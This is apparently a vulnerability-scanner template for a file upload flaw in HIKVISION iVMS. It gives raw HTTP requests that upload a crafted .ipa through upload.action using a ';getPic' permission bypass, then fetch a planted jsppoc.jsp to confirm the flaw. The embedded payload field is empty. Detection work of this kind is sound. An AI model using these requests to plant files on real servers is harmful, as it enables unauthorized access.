id: hikvision-ivms-upload-action-file-upload
info:
  name: HIKVISION iVMS upload.action File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    HIKVISION iVMS upload.action has an arbitrary file upload vulnerability. Attackers can bypass permissions by constructing a malicious IPA installation package containing directory traversal, thus obtaining server privileges.
  tags: file-upload
http:
  - raw:
      - |
        POST /msp/home/upload.action;getPic?&type=ios HTTP/1.1
        Host: {{Hostname}}
        User-Agent: MicroMessenger
        Content-Type: multipart/form-data; boundary=--------884337038

        ----------884337038
        Content-Disposition: form-data; name="file";filename="{{rand_base(6)}}.ipa"

        {{hex_decode("")}}
        ----------884337038--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
  - raw:
      - |
        GET /msp/upload/ios/{{rand_base(6)}}/jsppoc.jsp;getPic HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "e165421110ba03099a1c0393373c5b43"
